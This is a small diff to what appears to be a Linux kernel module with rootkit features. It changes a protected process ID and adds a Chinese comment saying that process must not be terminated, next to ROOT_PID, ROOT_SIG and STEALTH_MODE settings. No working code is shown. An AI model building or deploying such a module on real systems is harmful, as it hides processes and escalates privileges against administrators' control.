@@ -17,7 +17,7 @@ MODULE_LICENSE("GPL");
 #define ROOT_PID 7311
 #define ROOT_SIG 7
 
-static int lpid = 2916;
+static int lpid = 28427;//需要防止被终止的进程id
 module_param(lpid, int, 0);
 
 //#define STEALTH_MODE 1 
